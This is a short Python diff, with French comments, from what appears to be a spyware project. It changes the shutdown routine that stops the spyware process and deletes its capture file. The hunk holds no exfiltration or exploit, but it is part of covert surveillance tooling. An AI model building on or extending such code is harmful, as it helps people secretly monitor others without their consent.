@@ -5,8 +5,9 @@ import psutil
 import socket
 import threading
 import os
-import CLT
 import subprocess
+import CLT
+
 
 #Server configuration
 SERVER_HOST = '127.0.0.1'
@@ -71,12 +72,14 @@ def kill():
         #Arrêter toutes les instances du serveur en cours
         subprocess.run(['pkill', '-f', SERVER_HOST])
 
+        file=CLT.writeFile()
         #Avertir le spyware de s'arrêter
-        subprocess.run(['pkill', '-f', CLT.writeFile])#Remlacer par nom du spyware
+        subprocess.run(['pkill', '-f', file])
 
 
         #Supprimer la capture
-        os.remove(CLT.writeFile())  
+        
+        os.remove(file)  
         print("Capture supprimée avec succès.")
         
         print("Opérations terminées avec succès.")
